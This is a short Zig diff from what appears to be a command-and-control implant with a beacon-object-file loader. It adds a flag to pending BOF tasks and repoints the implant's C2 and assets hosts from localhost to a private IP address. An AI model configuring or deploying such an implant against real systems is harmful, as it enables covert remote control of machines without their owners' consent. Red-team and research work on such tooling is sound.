@@ -19,6 +19,7 @@ const PendingBof = struct {
     task_id: []const u8,
     is_persistent: bool = false,
     launcher_error_code: i32 = 0,
+    no_ret_value: bool = true,
 };
 
 pub const ImplantActions = extern struct {
@@ -109,9 +110,11 @@ pub const State = struct {
 
             .jitter = 3,
 
-            .c2_host = "127.0.0.1:8000",
+            //.c2_host = "127.0.0.1:8000",
+            .c2_host = "10.137.0.18:8000",
             .c2_endpoint = "/endpoint",
-            .assets_host = "127.0.0.1:8000",
+            //.assets_host = "127.0.0.1:8000",
+            .assets_host = "10.137.0.18:8000",
 
             .pending_bofs = std.array_list.Managed(PendingBof).init(allocator),
             .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
